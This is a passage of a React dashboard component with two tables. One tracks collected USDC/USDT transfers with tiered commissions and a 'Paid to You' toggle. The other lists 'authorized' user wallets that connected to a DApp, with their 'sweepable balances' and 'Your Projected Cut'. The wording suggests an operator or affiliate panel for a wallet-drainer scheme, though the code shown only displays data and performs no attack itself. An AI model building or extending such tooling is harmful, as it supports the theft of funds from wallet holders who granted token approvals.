                  </tr>
                ) : filteredRecords.length === 0 ? (
                  <tr>
                    <td colSpan={8} className="py-12 text-center text-slate-400">
                      No matching collection records found.
                    </td>
                  </tr>
                ) : (
                  filteredRecords.map((rec) => {
                    const commInfo =
                      calcMode === 'total_volume'
                        ? {
                            commission:
                              rec.amount *
                              (metrics.totalRevenue < THRESHOLD_AMOUNT ? RATE_UNDER_20K : RATE_ABOVE_20K),
                            effectiveRate:
                              metrics.totalRevenue < THRESHOLD_AMOUNT ? RATE_UNDER_20K : RATE_ABOVE_20K,
                            tierLabel:
                              metrics.totalRevenue < THRESHOLD_AMOUNT ? '15% (< $20k)' : '10% (≥ $20k)',
                          }
                        : calculateSingleCommission(rec.amount, calcMode);

                    const isPaid = Boolean(paidRecordIds[rec.id]);
                    const isUnder20k = rec.amount < THRESHOLD_AMOUNT;

                    return (
                      <tr key={rec.id} className="hover:bg-slate-800/30 transition-colors">
                        <td className="py-3.5 px-4 whitespace-nowrap">
                          <div className="font-semibold text-slate-200">
                            {new Date(rec.createdAt).toLocaleDateString('en-US', {
                              month: 'short',
                              day: 'numeric',
                              year: 'numeric',
                            })}
                          </div>
                          <div className="text-[10px] text-slate-400 flex items-center gap-1.5 mt-0.5">
                            <span
                              className={`inline-block w-1.5 h-1.5 rounded-full ${
                                rec.status === 'confirmed' ? 'bg-emerald-400' : 'bg-amber-400'
                              }`}
                            />
                            <span className="uppercase">{rec.source}</span>
                          </div>
                        </td>

                        <td className="py-3.5 px-4 font-mono">
                          <div className="flex items-center gap-1.5">
                            <span className="text-slate-200">
                              {rec.sender.slice(0, 8)}...{rec.sender.slice(-6)}
                            </span>
                            <button
                              onClick={() => handleCopy(rec.sender)}
                              className="text-slate-400 hover:text-white cursor-pointer"
                              title="Copy sender address"
                            >
                              {copiedText === rec.sender ? (
                                <Check className="w-3.5 h-3.5 text-emerald-400" />
                              ) : (
                                <Copy className="w-3.5 h-3.5" />
                              )}
                            </button>
                          </div>
                        </td>

                        <td className="py-3.5 px-4">
                          <span className="px-2 py-0.5 rounded bg-slate-800 text-slate-200 font-bold text-[11px]">
                            {rec.token.length > 8 ? 'USDC/USDT' : rec.token}
                          </span>
                        </td>

                        <td className="py-3.5 px-4 text-right font-mono font-bold text-white text-sm">
                          ${rec.amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                        </td>

                        <td className="py-3.5 px-4 text-center">
                          <span
                            className={`px-2 py-0.5 rounded-full text-[10px] font-extrabold ${
                              isUnder20k
                                ? 'bg-emerald-500/15 text-emerald-400 border border-emerald-500/30'
                                : 'bg-cyan-500/15 text-cyan-400 border border-cyan-500/30'
                            }`}
                          >
                            {commInfo.tierLabel}
                          </span>
                        </td>

                        <td className="py-3.5 px-4 text-right font-mono font-black text-emerald-400 text-sm">
                          ${commInfo.commission.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                        </td>

                        <td className="py-3.5 px-4 text-center">
                          {rec.txHash && rec.txHash.startsWith('0x') && rec.txHash.length > 20 ? (
                            <a
                              href={`https://${rec.chain === 'Sepolia' ? 'sepolia.' : ''}etherscan.io/tx/${rec.txHash}`}
                              target="_blank"
                              rel="noopener noreferrer"
                              className="inline-flex items-center gap-1 text-teal-400 hover:underline font-mono text-[11px]"
                            >
                              {rec.txHash.slice(0, 6)}...{rec.txHash.slice(-4)}
                              <ArrowUpRight className="w-3 h-3" />
                            </a>
                          ) : (
                            <span className="text-slate-500 text-[11px]">Internal</span>
                          )}
                        </td>

                        <td className="py-3.5 px-4 text-right">
                          <button
                            onClick={() => togglePaidStatus(rec.id)}
                            className={`px-3 py-1 rounded-lg text-[11px] font-bold transition-all cursor-pointer ${
                              isPaid
                                ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 hover:bg-emerald-500/30'
                                : 'bg-amber-500/15 text-amber-300 border border-amber-500/40 hover:bg-amber-500/25'
                            }`}
                          >
                            {isPaid ? '✓ Paid to You' : 'Mark as Paid'}
                          </button>
                        </td>
                      </tr>
                    );
                  })
                )}
              </tbody>
            </table>
          </div>
        </div>

        {/* Authorized Wallets Pipeline (Money Waiting to be Swept) */}
        <div className="bg-slate-900/90 border border-slate-800 rounded-2xl shadow-xl overflow-hidden">
          <div className="p-5 border-b border-slate-800 flex flex-col md:flex-row md:items-center md:justify-between gap-4">
            <div>
              <h2 className="text-base font-extrabold text-white flex items-center gap-2">
                <Wallet className="w-4 h-4 text-purple-400" />
                Authorized User Wallets (Pending Revenue Pipeline)
              </h2>
              <p className="text-xs text-slate-400 mt-0.5">
                Wallets that have connected to the DApp and their sweepable balances &amp; estimated commission when swept.
              </p>
            </div>

            <button
              onClick={handleInspectAuthorizedWallets}
              disabled={isScanningWallets}
              className="px-3.5 py-2 rounded-xl bg-purple-500 hover:bg-purple-400 disabled:opacity-50 text-slate-950 font-bold text-xs inline-flex items-center gap-1.5 cursor-pointer transition-all"
            >
              <RefreshCw className={`w-3.5 h-3.5 ${isScanningWallets ? 'animate-spin' : ''}`} />
              {isScanningWallets ? 'Checking On-Chain Balances...' : 'Refresh Live On-Chain Balances'}
            </button>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left border-collapse">
              <thead>
                <tr className="border-b border-slate-800 bg-slate-950/60 text-[11px] font-bold uppercase tracking-wider text-slate-400">
                  <th className="py-3 px-4">User / Alias</th>
                  <th className="py-3 px-4">Wallet Address</th>
                  <th className="py-3 px-4 text-center">Authorization</th>
                  <th className="py-3 px-4 text-right">Wallet Balance (USDT/USDC)</th>
                  <th className="py-3 px-4 text-center">Projected Tier</th>
                  <th className="py-3 px-4 text-right">Your Projected Cut</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-800/60 text-xs">
                {authorizedWallets.length === 0 ? (
                  <tr>
                    <td colSpan={6} className="py-8 text-center text-slate-400">
                      No registered user wallets found in Firestore.
                    </td>
                  </tr>
                ) : (
                  authorizedWallets.map((w) => {
                    const effectiveBal =
                      w.onChainBalance !== undefined && w.onChainBalance !== null
                        ? w.onChainBalance
                        : w.balanceUsdt;
                    const proj = calculateSingleCommission(effectiveBal, calcMode);
                    const isAuth = w.authorizationStatus === 'authorized' || w.isApproved;

                    return (
                      <tr key={w.uid} className="hover:bg-slate-800/30 transition-colors">
                        <td className="py-3 px-4 font-semibold text-white">{w.username}</td>
                        <td className="py-3 px-4 font-mono text-slate-300">
                          <a
                            href={`https://etherscan.io/address/${w.walletAddress}`}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="hover:text-teal-400 inline-flex items-center gap-1"
                          >
                            {w.walletAddress}
                            <ExternalLink className="w-3 h-3" />
                          </a>
                        </td>
                        <td className="py-3 px-4 text-center">
                          <span
                            className={`px-2 py-0.5 rounded-full text-[10px] font-bold ${
                              isAuth
                                ? 'bg-emerald-500/15 text-emerald-400 border border-emerald-500/30'
                                : 'bg-slate-800 text-slate-400'
                            }`}
                          >
                            {isAuth ? 'Authorized' : 'Connected'}
                          </span>
                        </td>
                        <td className="py-3 px-4 text-right font-mono font-bold text-white">
                          ${effectiveBal.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                        </td>
                        <td className="py-3 px-4 text-center">
                          <span className="text-[11px] text-slate-300 font-semibold">{proj.tierLabel}</span>
                        </td>
                        <td className="py-3 px-4 text-right font-mono font-bold text-purple-400">
                          ${proj.commission.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                        </td>
                      </tr>
                    );
                  })
                )}
              </tbody>
            </table>
          </div>
        </div>
      </main>
    </div>
  );
}

